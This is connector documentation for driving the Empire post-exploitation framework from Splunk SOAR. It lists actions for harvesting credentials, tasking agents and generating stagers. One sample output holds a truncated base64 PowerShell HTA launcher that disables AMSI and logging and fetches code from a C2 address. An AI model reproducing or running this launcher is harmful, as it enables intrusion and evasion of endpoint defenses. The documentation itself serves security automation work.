[comment]: # "Auto-generated SOAR connector documentation"
# Empire

Publisher: Phantom  
Connector Version: 1.0.18  
Product Vendor: Empire  
Product Name: Empire  
Product Version Supported (regex): ".\*"  
Minimum Product Version: 3.0.251  

This app supports a variety of actions to interact with the REST API of Empire - https://github.com/powershellempire/empire

### Configuration variables
This table lists the configuration variables required to operate Empire. These variables are specified when configuring a Empire asset in Splunk SOAR.

VARIABLE | REQUIRED | TYPE | DESCRIPTION
-------- | -------- | ---- | -----------
**base_url** |  required  | string | Base URL for the Empire REST API (e.g. https://192.168.1.1)
**port** |  required  | string | Port that the Empire REST API is listening on (default: 1337)
**verify_server_cert** |  optional  | boolean | Verify Server Cert
**username** |  required  | string | Username for accessing the Empire REST API
**password** |  required  | password | Password for accessing the Empire REST API

### Supported Actions  
[test connectivity](#action-test-connectivity) - Validate the asset configuration for connectivity using supplied configuration  
[get credentials](#action-get-credentials) - Get compromised credentials stored in Empire  
[execute module](#action-execute-module) - Execute a module or run a shell command in Empire  
[get module](#action-get-module) - Get a module by name in Empire  
[list modules](#action-list-modules) - List all available modules in Empire  
[get results](#action-get-results) - Get results from most recent agent command  
[terminate server](#action-terminate-server) - Kill a listener in Empire  
[terminate endpoint](#action-terminate-endpoint) - Kill an agent on an endpoint in Empire  
[remove endpoint](#action-remove-endpoint) - Remove an agent in Empire  
[list endpoints](#action-list-endpoints) - Returns all current agents in Empire  
[create payload](#action-create-payload) - Create a stager in Empire  
[get payload](#action-get-payload) - Get a stager by name  
[list payloads](#action-list-payloads) - List all current stagers  
[get server options](#action-get-server-options) - Get a list of options for a specified listener type  
[create server](#action-create-server) - Create a new listener  
[get server](#action-get-server) - Get a listener by name  
[list servers](#action-list-servers) - Get all current listeners  

## action: 'test connectivity'
Validate the asset configuration for connectivity using supplied configuration

Type: **test**  
Read only: **True**

#### Action Parameters
No parameters are required for this action

#### Action Output
No Output  

## action: 'get credentials'
Get compromised credentials stored in Empire

Type: **investigate**  
Read only: **True**

#### Action Parameters
No parameters are required for this action

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.status | string |  |   success 
action_result.message | string |  |   Total creds: 2 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.data.\*.creds.\*.username | string |  `user name`  |   DESHAW\\herman 
action_result.data.\*.creds.\*.domain | string |  `domain`  |   dc1.deshaw.com 
action_result.data.\*.creds.\*.credtype | string |  |   plaintext 
action_result.data.\*.creds.\*.notes | string |  |   2017-11-16 09:17:50 
action_result.data.\*.creds.\*.host | string |  `host name`  |   WIN-1DOIUPRU4D8 
action_result.data.\*.creds.\*.sid | string |  |    
action_result.data.\*.creds.\*.password | string |  |   genericpassword 
action_result.data.\*.creds.\*.os | string |  |   Microsoft Windows 7 Ultimate  
action_result.data.\*.creds.\*.ID | numeric |  |   3 
action_result.summary.total_creds | string |  |   2   

## action: 'execute module'
Execute a module or run a shell command in Empire

Type: **generic**  
Read only: **False**

#### Action Parameters
PARAMETER | REQUIRED | DESCRIPTION | TYPE | CONTAINS
--------- | -------- | ----------- | ---- | --------
**module_name_or_command** |  required  | Name of module to execute or shell command to run | string |  `empire module name` 
**agent_name** |  required  | Agent on which to execute module | string |  `empire agent name` 
**get_results** |  required  | Get results of module? | boolean | 
**is_shell_command** |  required  | Is this a shell command? | boolean | 
**options** |  optional  | JSON of additional options for module | string | 

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.parameter.module_name_or_command | string |  `empire module name`  |   powershell/privesc/powerup/allchecks  powershell/situational_awareness/network/powerview/get_loggedon 
action_result.parameter.agent_name | string |  `empire agent name`  |   CNEVH5SZ  4E6L1STN  Y6APU9DM  REH2UG54 
action_result.parameter.options | string |  |   {'ComputerName': 'localhost'} 
action_result.status | string |  |   success 
action_result.message | string |  |   Msg: tasked agent CNEVH5SZ to run module powershell/privesc/powerup/allchecks
Success: True  Msg: tasked agent 4E6L1STN to run module powershell/situational_awareness/network/powerview/get_loggedon
Taskid: 10
Success: True
Agentname: 4E6L1STN  Msg: tasked agent Y6APU9DM to run module powershell/situational_awareness/network/powerview/get_loggedon
Taskid: 52
Success: True
Agentname: Y6APU9DM  Msg: No message, Taskid: 13, Success: True, Agentname: REH2UG54 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.data.\*.msg | string |  |   tasked agent CNEVH5SZ to run module powershell/privesc/powerup/allchecks 
action_result.data.\*.taskID | numeric |  |   1 
action_result.data.\*.success | boolean |  |   True  False 
action_result.summary.msg | string |  |   tasked agent CNEVH5SZ to run module powershell/privesc/powerup/allchecks  tasked agent 4E6L1STN to run module powershell/situational_awareness/network/powerview/get_loggedon  tasked agent Y6APU9DM to run module powershell/situational_awareness/network/powerview/get_loggedon  No message 
action_result.summary.success | boolean |  |   True  False 
action_result.data.\*.results_lines | string |  |   \\nGet-NetLoggedon completed! 
action_result.data.\*.results_lines.\*.line | string |  |   Job started: 416Y98  CORP\\\\herman 
action_result.parameter.get_results | boolean |  |   True  False 
action_result.summary.taskID | numeric |  |   10  52  13 
action_result.summary.AgentName | string |  |   4E6L1STN  Y6APU9DM  REH2UG54 
action_result.parameter.is_shell_command | boolean |  |   True  False   

## action: 'get module'
Get a module by name in Empire

Type: **generic**  
Read only: **True**

#### Action Parameters
PARAMETER | REQUIRED | DESCRIPTION | TYPE | CONTAINS
--------- | -------- | ----------- | ---- | --------
**module_name** |  required  | Name of module to get | string |  `empire module name` 

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.parameter.module_name | string |  `empire module name`  |   powershell/situational_awareness/network/powerview/share_finder 
action_result.status | string |  |   success 
action_result.message | string |  |   Needsadmin: False
Name: powershell/situational_awareness/network/powerview/share_finder
Language: powershell 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.data.\*.modules.\*.Name | string |  `empire module name`  |   powershell/situational_awareness/network/powerview/share_finder 
action_result.data.\*.modules.\*.Language | string |  |   powershell 
action_result.data.\*.modules.\*.Author | string |  |   @herman 
action_result.data.\*.modules.\*.OpsecSafe | boolean |  |   True  False 
action_result.data.\*.modules.\*.Comments | string |  `url`  |   herman's comment 
action_result.data.\*.modules.\*.NeedsAdmin | boolean |  |   True  False 
action_result.data.\*.modules.\*.Background | boolean |  |   True  False 
action_result.data.\*.modules.\*.MinLanguageVersion | string |  |   2 
action_result.data.\*.modules.\*.options.Domain.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Domain.Description | string |  |   The domain to use for the query, defaults to the current domain. 
action_result.data.\*.modules.\*.options.Domain.Value | string |  |    
action_result.data.\*.modules.\*.options.DomainController.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.DomainController.Description | string |  |   Domain controller to reflect LDAP queries through. 
action_result.data.\*.modules.\*.options.DomainController.Value | string |  |    
action_result.data.\*.modules.\*.options.ComputerName.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.ComputerName.Description | string |  |   Hosts to enumerate. 
action_result.data.\*.modules.\*.options.ComputerName.Value | string |  |    
action_result.data.\*.modules.\*.options.Agent.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Agent.Description | string |  |   Agent to run module on. 
action_result.data.\*.modules.\*.options.Agent.Value | string |  `empire agent name`  |    
action_result.data.\*.modules.\*.options.Delay.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Delay.Description | string |  |   Delay between enumerating hosts, defaults to 0. 
action_result.data.\*.modules.\*.options.Delay.Value | string |  |    
action_result.data.\*.modules.\*.options.CheckShareAccess.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.CheckShareAccess.Description | string |  |   Switch. Only display found shares that the local user has access to. 
action_result.data.\*.modules.\*.options.CheckShareAccess.Value | string |  |    
action_result.data.\*.modules.\*.options.Threads.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Threads.Description | string |  |   The maximum concurrent threads to execute. 
action_result.data.\*.modules.\*.options.Threads.Value | string |  |    
action_result.data.\*.modules.\*.options.NoPing.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.NoPing.Description | string |  |   Don't ping each host to ensure it's up before enumerating. 
action_result.data.\*.modules.\*.options.NoPing.Value | string |  |    
action_result.data.\*.modules.\*.options.ComputerFilter.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.ComputerFilter.Description | string |  |   Host filter name to query AD for, wildcards accepted. 
action_result.data.\*.modules.\*.options.ComputerFilter.Value | string |  |    
action_result.data.\*.modules.\*.Description | string |  |   Finds shares on machines in the domain. Part of PowerView. 
action_result.summary.Language | string |  |   powershell 
action_result.summary.Name | string |  `empire module name`  |   powershell/situational_awareness/network/powerview/share_finder 
action_result.summary.NeedsAdmin | boolean |  |   True  False   

## action: 'list modules'
List all available modules in Empire

Type: **generic**  
Read only: **True**

This action also has an optional parameter to search for a module if you are not sure of the exact name.

#### Action Parameters
PARAMETER | REQUIRED | DESCRIPTION | TYPE | CONTAINS
--------- | -------- | ----------- | ---- | --------
**search_string** |  optional  | Option string to search for in module names | string | 

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.parameter.search_string | string |  |  
action_result.status | string |  |  
action_result.message | string |  |   Total modules: 13 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.data.\*.modules.\*.Name | string |  `empire module name`  |   herman edwards 
action_result.data.\*.modules.\*.Language | string |  |   success 
action_result.data.\*.modules.\*.Author | string |  |   @herman 
action_result.data.\*.modules.\*.OpsecSafe | boolean |  |   True  False 
action_result.data.\*.modules.\*.Comments | string |  `url`  |   another herman comment 
action_result.data.\*.modules.\*.NeedsAdmin | boolean |  |   True  False 
action_result.data.\*.modules.\*.Background | boolean |  |   True  False 
action_result.data.\*.modules.\*.OutputExtension | string |  |    
action_result.data.\*.modules.\*.MinLanguageVersion | string |  |   2.6 
action_result.data.\*.modules.\*.options.Image.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Image.Description | string |  |   Location of the image to use. 
action_result.data.\*.modules.\*.options.Image.Value | string |  |    
action_result.data.\*.modules.\*.options.Login.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Login.Description | string |  |   True/False to change the login background. 
action_result.data.\*.modules.\*.options.Login.Value | string |  |   False 
action_result.data.\*.modules.\*.options.Agent.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Agent.Description | string |  |   Agent to run on. 
action_result.data.\*.modules.\*.options.Agent.Value | string |  `empire agent name`  |    
action_result.data.\*.modules.\*.options.Desktop.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Desktop.Description | string |  |   True/False to change the desktop background. 
action_result.data.\*.modules.\*.options.Desktop.Value | string |  |   False 
action_result.data.\*.modules.\*.Description | string |  |   Change the login message for the user. 
action_result.data.\*.modules.\*.options.LocalImagePath.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.LocalImagePath.Description | string |  |   Local image path to set the agent wallpaper as. 
action_result.data.\*.modules.\*.options.LocalImagePath.Value | string |  |    
action_result.data.\*.modules.\*.options.Message.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Message.Description | string |  |   Message text to display. 
action_result.data.\*.modules.\*.options.Message.Value | string |  |   A herman message. 
action_result.data.\*.modules.\*.options.IconType.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.IconType.Description | string |  |   Critical, Exclamation, Information, Key, or None 
action_result.data.\*.modules.\*.options.IconType.Value | string |  |   Key 
action_result.data.\*.modules.\*.options.Title.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Title.Description | string |  |   Title of the message box to display. 
action_result.data.\*.modules.\*.options.Title.Value | string |  |   Windows Explorer 
action_result.data.\*.modules.\*.options.VoiceText.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.VoiceText.Description | string |  |   Text to synthesize on target. 
action_result.data.\*.modules.\*.options.VoiceText.Value | string |  |    
action_result.data.\*.modules.\*.options.VideoURL.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.VideoURL.Description | string |  |   A description 
action_result.data.\*.modules.\*.options.VideoURL.Value | string |  |    
action_result.data.\*.modules.\*.options.Text.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Text.Description | string |  |   The text to speak. 
action_result.data.\*.modules.\*.options.Text.Value | string |  |    
action_result.data.\*.modules.\*.options.Voice.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Voice.Description | string |  |   The voice to use. 
action_result.data.\*.modules.\*.options.Voice.Value | string |  |   herman 
action_result.data.\*.modules.\*.options.MsgText.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.MsgText.Description | string |  |   Message text to display. 
action_result.data.\*.modules.\*.options.MsgText.Value | string |  |   Hello world 
action_result.data.\*.modules.\*.options.ProcessName.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.ProcessName.Description | string |  |   Process name to kill on starting (wildcards accepted). 
action_result.data.\*.modules.\*.options.ProcessName.Value | string |  |    
action_result.data.\*.modules.\*.options.Sleep.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Sleep.Description | string |  |   Time to sleep between checks. 
action_result.data.\*.modules.\*.options.Sleep.Value | string |  |   1 
action_result.data.\*.modules.\*.options.Silent.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Silent.Description | string |  |   Switch. Don't output kill messages. 
action_result.data.\*.modules.\*.options.Silent.Value | string |  |    
action_result.data.\*.modules.\*.options.Remove.Required | boolean |  |   True  False 
action_result.data.\*.modules.\*.options.Remove.Description | string |  |   True/False to remove login message. 
action_result.data.\*.modules.\*.options.Remove.Value | string |  |   False 
action_result.summary.total_modules | numeric |  |   13   

## action: 'get results'
Get results from most recent agent command

Type: **generic**  
Read only: **False**

#### Action Parameters
PARAMETER | REQUIRED | DESCRIPTION | TYPE | CONTAINS
--------- | -------- | ----------- | ---- | --------
**agent_name** |  required  | Agent name for which to get results | string |  `empire agent name` 

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.parameter.agent_name | string |  `empire agent name`  |   CNEVH5SZ 
action_result.status | string |  |   success 
action_result.message | string |  |   Agentresults: [u''], Agentname: CNEVH5SZ 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.data.\*.results.\*.AgentName | string |  `empire agent name`  |   CNEVH5SZ 
action_result.data.\*.results.\*.AgentResults | string |  |    
action_result.summary.AgentName | string |  `empire agent name`  |   CNEVH5SZ 
action_result.summary.AgentResults | string |  |      

## action: 'terminate server'
Kill a listener in Empire

Type: **generic**  
Read only: **False**

This terminates the listener(s) on the empire server.

#### Action Parameters
PARAMETER | REQUIRED | DESCRIPTION | TYPE | CONTAINS
--------- | -------- | ----------- | ---- | --------
**listener_name** |  optional  | Listener name to kill | string |  `empire listener name` 
**kill_all** |  required  | Kill all listeners? | boolean | 

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.status | string |  |   success 
action_result.data.\*.success | boolean |  |   True  False 
action_result.message | string |  |   Success: True 
action_result.parameter.kill_all | boolean |  |   True  False 
action_result.parameter.listener_name | string |  `empire listener name`  |   bob_test 
action_result.summary.success | boolean |  |   True  False 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1   

## action: 'terminate endpoint'
Kill an agent on an endpoint in Empire

Type: **generic**  
Read only: **False**

This instructs the process on the remote machine to terminate.

#### Action Parameters
PARAMETER | REQUIRED | DESCRIPTION | TYPE | CONTAINS
--------- | -------- | ----------- | ---- | --------
**agent_name** |  optional  | Agent name to kill | string |  `empire agent name` 
**kill_all** |  required  | Kill all agents? | boolean | 

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.parameter.agent_name | string |  `empire agent name`  |   CNEVH5SZ 
action_result.status | string |  |   success 
action_result.message | string |  |   Success: True 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.data.\*.success | boolean |  |   True  False 
action_result.parameter.kill_all | boolean |  |   True  False 
action_result.summary.success | boolean |  |   True  False   

## action: 'remove endpoint'
Remove an agent in Empire

Type: **generic**  
Read only: **False**

This removes an agent from the Empire server database.  It is usually best to kill agent first.

#### Action Parameters
PARAMETER | REQUIRED | DESCRIPTION | TYPE | CONTAINS
--------- | -------- | ----------- | ---- | --------
**agent_name** |  optional  | Agent name to remove | string |  `empire agent name` 
**remove_stale** |  required  | Remove all stale agents? | boolean | 

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.status | string |  |   success 
action_result.data.\*.success | boolean |  |   True  False 
action_result.message | string |  |   Success: True 
action_result.parameter.agent_name | string |  `empire agent name`  |   ZU2S9D3A 
action_result.parameter.remove_stale | boolean |  |   True  False 
action_result.summary.success | boolean |  |   True  False 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1   

## action: 'list endpoints'
Returns all current agents in Empire

Type: **generic**  
Read only: **True**

#### Action Parameters
PARAMETER | REQUIRED | DESCRIPTION | TYPE | CONTAINS
--------- | -------- | ----------- | ---- | --------
**stale_only** |  required  | Return only stale agents? | boolean | 

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.status | string |  |   success 
action_result.message | string |  |   Total agents: 1 
action_result.parameter.stale_only | boolean |  |   True  False 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.data.\*.agents.\*.nonce | string |  |   7329946792862812 
action_result.data.\*.agents.\*.working_hours | string |  |    
action_result.data.\*.agents.\*.results | string |  |    
action_result.data.\*.agents.\*.internal_ip | string |  `ip`  |   172.16.25.128 
action_result.data.\*.agents.\*.jitter | numeric |  |   0 
action_result.data.\*.agents.\*.session_key | string |  |   =,NKlX|d1%j[P}n\\0CurmDF5fMJ>{U\*8 
action_result.data.\*.agents.\*.checkin_time | string |  |   2017-11-16 09:05:28 
action_result.data.\*.agents.\*.hostname | string |  `host name`  |   WIN-1DOIUPRU4D8 
action_result.data.\*.agents.\*.delay | numeric |  |   5 
action_result.data.\*.agents.\*.profile | string |  |   /admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko 
action_result.data.\*.agents.\*.kill_date | string |  |    
action_result.data.\*.agents.\*.process_name | string |  |   powershell 
action_result.data.\*.agents.\*.listener | string |  `empire listener name`  |   http 
action_result.data.\*.agents.\*.process_id | string |  |   2068 
action_result.data.\*.agents.\*.os_details | string |  |   Microsoft Windows 7 Ultimate  
action_result.data.\*.agents.\*.lost_limit | numeric |  |   60 
action_result.data.\*.agents.\*.ID | numeric |  |   4 
action_result.data.\*.agents.\*.taskings | string |  |    
action_result.data.\*.agents.\*.name | string |  `empire agent name`  |   2W3DPAXB 
action_result.data.\*.agents.\*.language | string |  |   powershell 
action_result.data.\*.agents.\*.external_ip | string |  `ip`  |   172.16.25.128 
action_result.data.\*.agents.\*.session_id | string |  |   2W3DPAXB 
action_result.data.\*.agents.\*.username | string |  `user name`  |   WIN-1DOIUPRU4D8\\Herman 
action_result.data.\*.agents.\*.lastseen_time | string |  |   2017-11-17 17:30:47 
action_result.data.\*.agents.\*.language_version | string |  |   4 
action_result.data.\*.agents.\*.high_integrity | numeric |  |   1 
action_result.summary.total_agents | numeric |  |   1   

## action: 'create payload'
Create a stager in Empire

Type: **generic**  
Read only: **False**

#### Action Parameters
PARAMETER | REQUIRED | DESCRIPTION | TYPE | CONTAINS
--------- | -------- | ----------- | ---- | --------
**stager_name** |  required  | The stager name to generate | string |  `empire stager name` 
**listener_name** |  required  | The listener name to generate stager for | string |  `empire listener name` 
**options** |  optional  | JSON of options for stager | string | 

#### Action Output
DATA PATH | TYPE | CONTAINS | EXAMPLE VALUES
--------- | ---- | -------- | --------------
action_result.parameter.stager_name | string |  `empire stager name`  |   windows/hta 
action_result.parameter.listener_name | string |  `empire listener name`  |   http 
action_result.parameter.options | string |  |  
action_result.status | string |  |   success 
action_result.message | string |  |   Stagercreated: True 
summary.total_objects | numeric |  |   1 
summary.total_objects_successful | numeric |  |   1 
action_result.data.\*.windows/hta.ProxyCreds.Required | boolean |  |   True  False 
action_result.data.\*.windows/hta.ProxyCreds.Description | string |  |   Proxy credentials ([domain\\]username:password) to use for request (default, none, or other). 
action_result.data.\*.windows/hta.ProxyCreds.Value | string |  |   default 
action_result.data.\*.windows/hta.Language.Required | boolean |  |   True  False 
action_result.data.\*.windows/hta.Language.Description | string |  |   Language of the stager to generate. 
action_result.data.\*.windows/hta.Language.Value | string |  |   powershell 
action_result.data.\*.windows/hta.Base64.Required | boolean |  |   True  False 
action_result.data.\*.windows/hta.Base64.Description | string |  |   Switch. Base64 encode the output. 
action_result.data.\*.windows/hta.Base64.Value | string |  |   True 
action_result.data.\*.windows/hta.StagerRetries.Required | boolean |  |   True  False 
action_result.data.\*.windows/hta.StagerRetries.Description | string |  |   Times for the stager to retry connecting. 
action_result.data.\*.windows/hta.StagerRetries.Value | string |  |   0 
action_result.data.\*.windows/hta.Listener.Required | boolean |  |   True  False 
action_result.data.\*.windows/hta.Listener.Description | string |  |   Listener to generate stager for. 
action_result.data.\*.windows/hta.Listener.Value | string |  `empire listener name`  |   http 
action_result.data.\*.windows/hta.OutFile.Required | boolean |  |   True  False 
action_result.data.\*.windows/hta.OutFile.Description | string |  |   File to output HTA to, otherwise displayed on the screen. 
action_result.data.\*.windows/hta.OutFile.Value | string |  |    
action_result.data.\*.windows/hta.Obfuscate.Required | boolean |  |   True  False 
action_result.data.\*.windows/hta.Obfuscate.Description | string |  |   Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only. 
action_result.data.\*.windows/hta.Obfuscate.Value | string |  |   False 
action_result.data.\*.windows/hta.Proxy.Required | boolean |  |   True  False 
action_result.data.\*.windows/hta.Proxy.Description | string |  |   Proxy to use for request (default, none, or other). 
action_result.data.\*.windows/hta.Proxy.Value | string |  |   default 
action_result.data.\*.windows/hta.Output | string |  |   <html><head><script>var c= 'powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAUwBJAG8ATgBUAGEAYgBMAGUALgBQAFMAVgBlAFIAUwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0AZwBlACAAMwApAHsAJABHAFAAUwA9AFsAUgBFAGYAXQAuAEEAUwBzAGUATQBCAGwAeQAuAEcARQB0AFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBFAFQAVgBBAEwAdQBlACgAJABOAHUATABsACkAOwBJAGYAKAAkAEcAUABTAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAA7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0ARQBMAHMAZQB7AFsAUwBjAHIAaQBwAFQAQgBMAE8AQwBrAF0ALgAiAEcAZQB0AEYAaQBlAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAGEATABVAEUAKAAkAG4AdQBMAGwALAAoAE4ARQBXAC0ATwBCAEoAZQBjAHQAIABDAG8AbABMAGUAQwBUAEkATwBOAFMALgBHAEUAbgBlAHIASQBDAC4ASABhAFMASABTAGUAdABbAFMAdABSAEkAbgBnAF0AKQApAH0AWwBSAGUARgBdAC4AQQBzAHMARQBtAGIATABZAC4ARwBFAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkAZQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBsAHUARQAoACQAbgBVAEwAbAAsACQAVABSAHUAZQApAH0AOwB9ADsAWwBTAHkAcwB0AEUATQAuAE4AZQB0AC4AUwBlAHIAVgBJAEMAZQBQAE8ASQBOAFQATQBBAE4AQQBHAGUAcgBdADoAOgBFAFgAcABlAGMAVAAxADAAMABDAG8ATgB0AGkATgBVAGUAPQAwADsAJABXAEMAPQBOAEUAdwAtAE8AQgBKAGUAYwBUACAAUwB5AFMAdABlAE0ALgBOAEUAVAAuAFcARQBiAEMAbABJAEUATgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAdwBDAC4ASABFAEEAZABFAFIAcwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUABSAG8AeAB5AD0AWwBTAHkAUwBUAGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBlAFEAdQBFAFMAdABdADoAOgBEAGUARgBhAFUATAB0AFcAZQBCAFAAUgBvAHgAWQA7ACQAdwBDAC4AUAByAE8AWABZAC4AQwBSAGUAZABFAE4AVABJAEEAbABTACAAPQAgAFsAUwB5AFMAVABlAG0ALgBOAGUAVAAuAEMAUgBFAEQAZQBuAHQASQBhAEwAQwBhAEMASABlAF0AOgA6AEQARQBmAGEAVQBMAHQATgBFAFQAdwBPAFIAawBDAFIARQBkAEUATgBUAEkAQQBsAFMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAUwB0AEUATQAuAFQARQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgBZAHQAZQBzACgAJwA/ADcAbgBhAFMASABzAEsAewA7AGcAbwBwAEwAVgBtAEEAUgAsADkAbABeAF0AKwAqAGgAegApAHEALwA9AHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADIANQAuADEANQA4ADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAVwBDAC4ASABlAGEAZABFAFIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AQwB5AGwAVQAyAGMARwBrAEkAYwAxAEkASQBmADgAcQBrAGoANgBEAHMAcgBjAEUAUAArAFkAPQAiACkAOwAkAEQAQQBUAEEAPQAkAFcAQwAuAEQAbwB3AE4ATABvAGEARABEAGEAVABhACgAJABzAEUAUgArACQAVAApADsAJABpAHYAPQAkAEQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAEQAYQBUAEEAPQAkAGQAQQB0AGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBnAHQASABdADsALQBqAG8AaQBuAFsAQwBoAEEAUgBbAF0AXQAoA